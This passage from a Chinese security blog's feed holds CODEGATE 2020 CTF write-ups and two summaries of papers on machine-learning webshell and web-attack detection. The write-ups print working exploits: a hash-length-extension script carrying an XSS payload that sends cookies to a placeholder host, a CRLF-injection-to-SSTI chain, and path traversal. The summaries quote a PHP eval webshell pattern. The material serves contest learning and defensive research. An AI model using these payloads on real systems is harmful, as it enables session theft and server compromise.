alt=""><br>参考link：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.yulegeyu.com/2018/07/15/CSP-unsafe-inline%E6%97%B6-%E5%BC%95%E5%85%A5%E5%A4%96%E9%83%A8js/</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-02-09-16-37-54.png" alt=""><br>得到:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api.php?sig=fa74cda5bdd2f4da4170e064a5462449&amp;q=YUdWaFpHVnksU0ZSVVVDOHhJRFF3TkE9PSxjMnQ1YzJWag==</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-02-09-16-20-27.png" alt=""><br>构造：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_exp</span><span class="params">(a,b,c)</span>:</span></span><br><span class="line"><span class="keyword">return</span> base64.b64encode(a)+<span class="string">','</span>+base64.b64encode(b)+<span class="string">','</span>+base64.b64encode(c)</span><br><span class="line"></span><br><span class="line">old_sig = <span class="string">"fa74cda5bdd2f4da4170e064a5462449"</span></span><br><span class="line">old_data = base64.b64decode(<span class="string">'YUdWaFpHVnksU0ZSVVVDOHhJRFF3TkE9PSxjMnQ1YzJWag=='</span>)  <span class="comment">#header,HTTP/1 404,skysec</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://110.10.147.166/api.php?sig=%s&amp;q=%s"</span></span><br><span class="line"></span><br><span class="line">a = <span class="string">'body'</span></span><br><span class="line">b = <span class="string">'''&lt;img src=x onerror="location.href='//vps:23334/?c='+escape(document.cookie);"</span></span><br><span class="line"><span class="string">&gt;'''</span></span><br><span class="line">c = <span class="string">''</span></span><br><span class="line">exp = <span class="string">'|'</span>+gen_exp(a,b,c)</span><br><span class="line">result = hashpumpy.hashpump(old_sig, old_data, exp, <span class="number">12</span>)</span><br><span class="line">new_sig = result[<span class="number">0</span>]</span><br><span class="line">new_data = base64.b64encode(result[<span class="number">1</span>])</span><br><span class="line">now_url = url % (new_sig,new_data)</span><br><span class="line"><span class="keyword">print</span> now_url</span><br></pre></td></tr></table></figure></p><p>得到exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://110.10.147.166/api.php?sig=812ada09f5d2713a436156061126977d&amp;q=YUdWaFpHVnksU0ZSVVVDOHhJRFF3TkE9PSxjMnQ1YzJWaoAAAAAAAAAAAABwAQAAAAAAAHxZbTlrZVE9PSxQR2x0WnlCemNtTTllQ0J2Ym1WeWNtOXlQU0pzYjJOaGRHbHZiaTVvY21WbVBTY3ZMekV3Tmk0eE5DNHhNVFF1TVRJM09qSXpNek0wTHo5alBTY3JaWE5qWVhCbEtHUnZZM1Z0Wlc1MExtTnZiMnRwWlNrN0lnbyss</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-02-09-16-55-48.png" alt=""><br>得到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CODEGATE2020&#123;CSP_m34n5_Content-Success-Policy_n0t_Security&#125;</span><br></pre></td></tr></table></figure></p><h2 id="renderer"><a href="#renderer" class="headerlink" title="renderer"></a>renderer</h2><h3 id="XFF可控"><a href="#XFF可控" class="headerlink" title="XFF可控"></a>XFF可控</h3><p><img src="/images/2020-02-09-11-31-39.png" alt=""><br>题目给予了一个路由，尝试访问后发现，XFF可控：<br><img src="/images/2020-02-09-11-32-10.png" alt=""><br>但是fuzz后发现，好像并不能直接利用。</p><h3 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h3><p>后续关注到题目给予了dockerfile：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">FROM python:2.7.16</span><br><span class="line"></span><br><span class="line">ENV FLAG CODEGATE2020&#123;**DELETED**&#125;</span><br><span class="line"></span><br><span class="line">RUN apt-get update</span><br><span class="line">RUN apt-get install -y nginx</span><br><span class="line">RUN pip install flask uwsgi</span><br><span class="line"></span><br><span class="line">ADD prob_src/src /home/src</span><br><span class="line">ADD settings/nginx-flask.conf /tmp/nginx-flask.conf</span><br><span class="line"></span><br><span class="line">ADD prob_src/static /home/static</span><br><span class="line">RUN chmod 777 /home/static</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/tickets</span><br><span class="line">RUN chmod 777 /home/tickets</span><br><span class="line"></span><br><span class="line">ADD settings/run.sh /home/run.sh</span><br><span class="line">RUN chmod +x /home/run.sh</span><br><span class="line"></span><br><span class="line">ADD settings/cleaner.sh /home/cleaner.sh</span><br><span class="line">RUN chmod +x /home/cleaner.sh</span><br><span class="line"></span><br><span class="line">CMD [&quot;/bin/bash&quot;, &quot;/home/run.sh&quot;]</span><br></pre></td></tr></table></figure></p><p>同时注意到其用urllib完成了request功能：<br><img src="/images/2020-02-09-11-27-45.png" alt=""><br>那么尝试使用CVE，探测是否存在CRLF注入：CVE-2019-9947，发现其漏洞范围为2.x ~ 2.7.16刚好符合dockerfile中的版本号，于是进行尝试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[vps-ip]:23333?%0d%0apayload%0d%0apadding</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-02-09-11-30-42.png" alt=""><br>发现确实存在CRLF注入攻击。<br>进一步尝试，利用CLRF注入，访问题目的whatismyip功能：<br><img src="/images/2020-02-09-11-52-39.png" alt=""><br>发现确实可以进行127.0.0.1的伪造访问，并且可控XFF，但陷入僵局。</p><h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><p>赛后得知，题目可以进行目录穿越，进行任意文件下载：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://58.229.253.144/static../src/app/routes.py</span><br></pre></td></tr></table></figure></p><p>审计代码发现：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@front.route("/admin", methods=["GET"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_access</span><span class="params">()</span>:</span></span><br><span class="line">    ip = get_ip()</span><br><span class="line">    rip = get_real_ip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">"127.0.0.1"</span>, <span class="string">"127.0.0.2"</span>]: <span class="comment">#super private ip :)</span></span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ip != rip: <span class="comment">#if use proxy</span></span><br><span class="line">        ticket = write_log(rip)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">"admin_remote.html"</span>, ticket = ticket)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> ip == <span class="string">"127.0.0.2"</span> <span class="keyword">and</span> request.args.get(<span class="string">"body"</span>):</span><br><span class="line">            ticket = write_extend_log(rip, request.args.get(<span class="string">"body"</span>))</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">"admin_local.html"</span>, ticket = ticket)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">"admin_local.html"</span>, ticket = <span class="keyword">None</span>)</span><br></pre></td></tr></table></figure></p><p>我们可以利用其中代码对log写入内容:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ip != rip: <span class="comment">#if use proxy</span></span><br><span class="line">    ticket = write_log(rip)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"admin_remote.html"</span>, ticket = ticket)</span><br></pre></td></tr></table></figure></p><p>而跟进rip，其赋值来自于：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip = get_real_ip()</span><br></pre></td></tr></table></figure></p><p>跟进函数实现：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_real_ip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> request.headers.get(<span class="string">"X-Forwarded-For"</span>) <span class="keyword">or</span> get_ip()</span><br></pre></td></tr></table></figure></p><p>发现可用XFF控制写入log内容。<br>跟进write_log：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_log</span><span class="params">(rip)</span>:</span></span><br><span class="line">    tid = hashlib.sha1(str(time.time()) + rip).hexdigest()</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"/home/tickets/%s"</span> % tid, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        log_str = <span class="string">"Admin page accessed from %s"</span> % rip</span><br><span class="line">        f.write(log_str)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> tid</span><br></pre></td></tr></table></figure></p><p>故此，可以尝试在/admin路由，利用XFF写入文件，同时会返回其ticket:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://127.0.0.1/renderer/admin+HTTP/1.1%0aX-Forwarded-For: &#123;&#123;1+1&#125;&#125;%0a</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-02-09-11-53-23.png" alt=""><br>而后，利用/admin/ticket读取文件，触发ssti:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_ticket</span><span class="params">()</span>:</span></span><br><span class="line">    ip = get_ip()</span><br><span class="line">    rip = get_real_ip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ip != rip: <span class="comment">#proxy doesn't allow to show ticket</span></span><br><span class="line">        <span class="keyword">print</span> <span class="number">1</span></span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">"127.0.0.1"</span>, <span class="string">"127.0.0.2"</span>]: <span class="comment">#only local</span></span><br><span class="line">        <span class="keyword">print</span> <span class="number">2</span></span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    <span class="keyword">if</span> request.headers.get(<span class="string">"User-Agent"</span>) != <span class="string">"AdminBrowser/1.337"</span>:</span><br><span class="line">        <span class="keyword">print</span> request.headers.get(<span class="string">"User-Agent"</span>)</span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">"ticket"</span>):</span><br><span class="line">        log = read_log(request.args.get(<span class="string">"ticket"</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> log:</span><br><span class="line">            <span class="keyword">print</span> <span class="number">4</span></span><br><span class="line">            abort(<span class="number">403</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template_string(log)</span><br></pre></td></tr></table></figure></p><p>构造exp如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = http://127.0.0.1/renderer/admin/ticket?ticket=c0105720c3cd521aadd35064b24db9699b2bc646+HTTP/1.1%0aUser-Agent: AdminBrowser/1.337%0aX-Forwarded-For: 127.0.0.1%0aA: B%0a</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-02-09-12-18-40.png" alt=""><br>测试发现，确实可以伪造http header。但是此处存在一个问题，即UA覆盖，最下面的UA，会覆盖我们上面的UA，所以得Connection: close。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = http://127.0.0.1/renderer/admin/ticket?ticket=c0105720c3cd521aadd35064b24db9699b2bc646 HTTP/1.1%0d%0aHost: 127.0.0.1%0d%0aUser-Agent: AdminBrowser/1.337%0d%0aX-Forwarded-For: 127.0.0.1%0d%0aConnection: close%0d%0a%0d%0askycool</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-02-09-12-26-34.png" alt=""><br>即可触发ssti:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> request.args.get(<span class="string">"ticket"</span>):</span><br><span class="line">    log = read_log(request.args.get(<span class="string">"ticket"</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> log:</span><br><span class="line">        <span class="keyword">print</span> <span class="number">4</span></span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(log)</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-02-09-12-51-39.png" alt=""><br>发现flag位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ENV FLAG CODEGATE2020&#123;**DELETED**&#125;</span><br></pre></td></tr></table></figure></p><p>exp如下:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">'http://58.229.253.144/renderer/'</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'''http://127.0.0.1/renderer/admin HTTP/1.1%%0d%%0aX-Forwarded-For: %s%%0d%%0a'''</span></span><br><span class="line">payload2 = <span class="string">'''http://127.0.0.1/renderer/admin/ticket?ticket=%s HTTP/1.1%%0d%%0aHost: 127.0.0.1%%0d%%0aUser-Agent: AdminBrowser/1.337%%0d%%0aX-Forwarded-For: 127.0.0.1%%0d%%0aConnection: close%%0d%%0a%%0d%%0askycool'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssti_payload = <span class="string">'''&#123;&#123;config&#125;&#125;'''</span></span><br><span class="line"></span><br><span class="line">exp1 = payload1 % ssti_payload</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'url'</span>:urllib.unquote(exp1)</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url,data=data)</span><br><span class="line">ticket = r.content[<span class="number">1652</span>:<span class="number">1692</span>]</span><br><span class="line">exp2 = payload2%ticket</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'url'</span>:urllib.unquote(exp2)</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url,data=data)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><p>运行即可拿到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CODEGATE2020&#123;CrLfMakesLocalGreatAgain&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;CSP&quot;&gt;&lt;a href=&quot;#CSP&quot; class=&quot;headerlink&quot; title=&quot;CSP&quot;&gt;&lt;/a&gt;CSP&lt;/h2&gt;&lt;p&gt;随手尝试：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gut
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Paper Summary &amp; Webshell Detection Based on Random Forest–Gradient Boosting Decision Tree Algorithm</title>
    <link href="http://skysec.top/2020/01/14/Paper-Summary-Webshell-Detection-Based-on-Random-Forest%E2%80%93Gradient-Boosting-Decision-Tree-Algorithm/"/>
    <id>http://skysec.top/2020/01/14/Paper-Summary-Webshell-Detection-Based-on-Random-Forest–Gradient-Boosting-Decision-Tree-Algorithm/</id>
    <published>2020-01-14T02:21:54.000Z</published>
    <updated>2020-06-11T00:56:29.086Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇文章《Webshell Detection Based on Random Forest–Gradient Boosting Decision Tree Algorithm》是和前一篇文章《Detecting Webshell Based on Random Forest with FastText》同一学校所作，研究问题依旧是检测webshell，两篇文章同样是利用了随机森林算法，前一篇结合的是fastText，而本篇文章结合的是梯度提升迭代决策树算法。</p><h2 id="研究方法"><a href="#研究方法" class="headerlink" title="研究方法"></a>研究方法</h2><p>在前一篇文章中，对于features的提取分为两大步：</p><ol><li>分析提取文件的静态特征</li><li>利用PHP-VLD获取文件的Opcode，利用fastText训练文本分类器模型<h3 id="静态特征"><a href="#静态特征" class="headerlink" title="静态特征"></a>静态特征</h3>而本篇文章中所用和其相似，但有所提升，作者在前一篇文章的基础上增加了如下文件的静态特征：<br>1.数据压缩比<br>由于base64方式压缩的webshell通常具有更均衡的特定字符分布，并且往往具有更高的数据压缩比，因此使用数据压缩比检测webshell，有一定的成效。<br>2.eval函数的使用<br>一句话木马的重要特性即eval，一般的一句话木马格式如下：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">eval</span> ($_post[xxxxx])</span><br></pre></td></tr></table></figure></li></ol><p>因此一个文件的eval的数量是模型训练的一个重要feature。<br>如此之外，之前的文章利用PHP-VLD提取文件Opcode，再使用fastText训练文本分类器，而本篇文章与之不同，作者将获得的Opcode，使用Scikit-learn从中提取2种特征：TF-IDF向量和Hash向量。</p><h3 id="TF-IDF-Vector"><a href="#TF-IDF-Vector" class="headerlink" title="TF-IDF Vector"></a>TF-IDF Vector</h3><p>TF即Term frequency，词频计算公式如下：<br><img src="/images/2020-01-14-10-54-31.png" alt=""><br>其用来评估一个词语在文本中出现的频率。<br>IDF即inverse document frequency，逆文本频率指数如下：<br><img src="/images/2020-01-14-10-55-28.png" alt=""><br>其用于评估该词语在所有文本中是否罕见。<br>故此TF-IDF的主要思想是：如果某个词或短语在一篇文章中出现的频率TF高，并且在其他文章中很少出现，则认为此词或者短语具有很好的类别区分能力，适合用来分类。<br>其计算方法如下：<br><img src="/images/2020-01-14-10-58-18.png" alt=""></p><h3 id="Hash-Vector"><a href="#Hash-Vector" class="headerlink" title="Hash Vector"></a>Hash Vector</h3><p>hash散列可以将任意长度的数据转换为固定长度的数据，同时这种这种转换通常是一对一的，我们很难找到同样的hash对应不同的数据。因此可以利用hash作为某个特征向量的索引，因此无需创建大型字典，而这个恰好是TF-IDF所缺乏的。<br>例如：特征 i 会被hash到索引位置j：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h(i) = j</span><br></pre></td></tr></table></figure></p><p>特征 i 的词频表示为φ(i)，那么公式如下：<br><img src="/images/2020-01-14-11-04-48.png" alt=""><br>在提取特征结束后，作者尝试在仅适用6个静态特征和GBDT算法进行检测,成功率已达96.9%。<br>对于GBDT算法，其核心是：每棵树学的是之前所有树结论和的残差，即真实值-预测值。每一轮梯度boosting训练都会减少上一轮训练的残差，即在梯度方向上训练一个新的模型来降低上一轮训练的残差。<br><img src="/images/2020-01-14-13-52-13.png" alt=""><br>其优点在于可以有效减少feature，降低过拟合现象，并且具有更高的鲁棒性，不太可能受到训练集规模的影响。<br>这也是作者将其与随机森林算法结合使用的一个原因。同时为了进一步提高效率,作者加入了PHP Opcode的特征提取，和随机森林算法：<br><img src="/images/2020-01-14-11-16-59.png" alt=""><br>在结合前6个静态特征后，作者使用随机森林获取TF-IDF矩阵和hash矩阵的预测结果，最后结合8个feature对GBDT进行训练。</p><h2 id="数据实验"><a href="#数据实验" class="headerlink" title="数据实验"></a>数据实验</h2><p>作者从Github收集了2232个webshell，2388 CMS样本文件：<img src="/images/2020-01-14-11-07-23.png" alt=""><br>但由于有些文件提取特征不成功，或者并非php文件，作者丢弃了大小超过20000的文件，并未使用。<br>而后作者从如下几个角度评估了RF-GBDT算法的性能：<br><img src="/images/2020-01-14-11-09-56.png" alt=""><br><img src="/images/2020-01-14-11-10-08.png" alt=""><br>同时作者进行了一些对照实验，结果如下：<br><img src="/images/2020-01-14-11-12-34.png" alt=""><br><img src="/images/2020-01-14-14-13-26.png" alt=""><br>可以看到，如果仅用6个静态features的GBDT在各方面的性能都不如使用8个features的RF-GBDT。除此之外，作者还挑选了一些网上主流的webshell检测工具，结果如下：<br><img src="/images/2020-01-14-11-13-43.png" alt=""><br>这同时也证明了RF-GBDT具有非常好的性能。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本篇文章《Webshell Detection Based on Random Forest–Gradient Boosting Decis
      
    
    </summary>
    
      <category term="paper" scheme="http://skysec.top/categories/paper/"/>
    
    
      <category term="paper" scheme="http://skysec.top/tags/paper/"/>
    
  </entry>
  
  <entry>
    <title>Paper Summary &amp; Evaluating CNN and LSTM for Web Attack Detection</title>
    <link href="http://skysec.top/2020/01/13/Paper-Summary-Evaluating-CNN-and-LSTM-for-Web-Attack-Detection/"/>
    <id>http://skysec.top/2020/01/13/Paper-Summary-Evaluating-CNN-and-LSTM-for-Web-Attack-Detection/</id>
    <published>2020-01-13T07:37:35.000Z</published>
    <updated>2020-06-11T00:56:39.811Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇paper来自ICMLC 2018，与前一篇文章《CNN-Webshell &amp; Malicious Web Shell Detection with Convolutional Neural Network》出自同一学校，应该是之前工作的改进版。其对于webshell的检测也是主要集中于HTTP Requests检测。</p><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>与2017年的paper《CNN-Webshell: Malicious Web Shell Detection with Convolutional Neural Network》不同，作者在本篇文章中改良了之前对HTTP Requests流量文本分割的方式。<br>根据之前的工作，通过符号<code>\&amp;</code>进行分割后，每一个单词可以变为一个one-hot向量，对于一个长为L的序列，其可以得到一组one-hot向量：<br><img src="/images/2020-01-13-19-17-32.png" alt=""><br>但这样是非常浪费时间的，不仅因为其是高维向量，并且忽略了单词与单词之间的关系。受到word embedding的启发，作者将one-hot向量转换成一个低维连续向量：<br><img src="/images/2020-01-13-19-20-44.png" alt=""><br>其可以通过one-hot向量左乘权重矩阵来实现：<br><img src="/images/2020-01-13-19-21-35.png" alt=""><br>其中：<br><img src="/images/2020-01-13-19-21-44.png" alt="">，|V|是词汇表中唯一单词的数目。<br>对于矩阵M，其可以通过随机分配或学习具有一个隐藏层的网络来获得。在此作者通过输入一个词（一个one-hot向量）并输出下一个词（一个one-hot向量）来训练网络，以学习两个共现词之间的关系。同时经过实验，这样得到的矩阵M比随机分配具有更好的性能。<br>经过这样转换，之前的one-hot向量序列转换为如下矩阵：<br><img src="/images/2020-01-13-19-25-07.png" alt=""></p><h2 id="研究方法"><a href="#研究方法" class="headerlink" title="研究方法"></a>研究方法</h2><p>众所周知，CNN可以通过卷积层和池化层，提取较为重要的features，而LSTM可以存储长期依赖关系，那么很自然的想到，可以将二者融合，用来处理webshell检测的问题。<br><img src="/images/2020-01-13-16-49-26.png" alt=""><img src="/images/2020-01-13-16-49-41.png" alt=""><br>首先通过CNN的卷积，我们可以得到如下结果：<br><img src="/images/2020-01-13-19-10-26.png" alt=""><br>其中b是偏差，φ是非线性校正函数，n个滤波器为：<br><img src="/images/2020-01-13-19-10-42.png" alt=""><br>但是由于卷积层和池化层产生的结果是一个向量，并不能直接和LSTM进行结合，所以为了解决这个问题，作者将全局最大池替换为局部最大池，那么在t位置时，局部最大池的结果为：<br><img src="/images/2020-01-13-16-51-06.png" alt=""><br>故此我们可以得到一组新的向量：<br><img src="/images/2020-01-13-16-52-18.png" alt=""><br>此时：<br><img src="/images/2020-01-13-16-52-26.png" alt=""><br><img src="/images/2020-01-13-16-52-32.png" alt=""><br>那么此时，即可将gt序列输入LSTM，完成组合分类：<br><img src="/images/2020-01-13-16-44-43.png" alt=""><br>对于CNN+LSTM的算法，输入单词维数为40，每个序列固定长度为56个单词。对于CNN，其具有100个宽度为5的滤波器和一个大小为5的本地最大池层，然后使用rate为0.9的dropout层来抑制过拟合。并将输出输入LSTM，而对于LSTM，其隐藏变量维数为100，其最后的输出同样连接到rate为0.9的dropout层。</p><h2 id="数据实验"><a href="#数据实验" class="headerlink" title="数据实验"></a>数据实验</h2><p>实验中使用的数据集为CSIC2010。在实验中，测试集中有超过36000个正常请求和25000个异常请求。异常请求包含大量的web攻击，如SQL注入、信息收集、文件泄漏、CRLF注入、XSS和参数篡改等。<br>同样的，实验中也将提出的算法与传统方法进行了比较，比较对象如下：</p><ul><li>Multinomial Naive Bayes (NB)</li><li>Linear Support Vector Machine (Linear SVM)</li><li>Neural Network (NN)</li><li>k-Nearest Neighbour (kNN)</li><li>Decision Tree (DT)<br>结果如下：<br><img src="/images/2020-01-13-16-42-34.png" alt=""><br>可以发现CNN+LSTM的算法取得了最好的性能。同时由于卷积网络中滤波器的数目和滑动窗口的宽度是关键参数，因此实验测试了不同数量的滤波器和滤波器宽度。结果如下：<br><img src="/images/2020-01-13-16-22-30.png" alt=""><br>可以发现，对于滤波器数量，性能在100个时表现最好，而对于滤波器宽度，性能在5时达到高值，而后缓慢增长。<br>同时考虑到LSTM的关键参数是隐藏变量的维数，所以实验对于不同维数也做了相应的测试，结果如下：<br><img src="/images/2020-01-13-16-25-04.png" alt=""><br>可以发现维数在20~300这个区间内，LSTM的性能一直在提升，但是考虑到时间消耗会随维数上升而上升，所以需要权衡二者之前的关系，达到最佳性价比。<br>并且实验还测试了不同局部最大池大小对CNN+LSTM的性能影响，结果如下：<br><img src="/images/2020-01-13-16-28-56.png" alt=""><br>可以发现，当本地最大池大小设置为3时，会取得最佳性能。<br>除此之外，针对于小规模的CSIC2010数据集，过拟合问题也是关注的一个点，实验使用dropout方法进行抑制拟合，并对其进行评估，结果如下：<br><img src="/images/2020-01-13-16-30-07.png" alt=""><br>可以发现LSTM对于dropout rate有较大的变化，而CNN和CNN+LSTM方法更加具有鲁棒性，其在rate大于0.3后，性能缓慢增长。<br>最后，对于前文所提到的矩阵M的获取也是一个关键因素，实验使用了随机分配和机器学习两种方式进行比对测试，结果如下：<br><img src="/images/2020-01-13-16-32-40.png" alt=""><br>不难发现经过机器学习后的模型拥有更好的性能。</li></ul><h2 id="后记"><a href="#后记" class="headerlink" 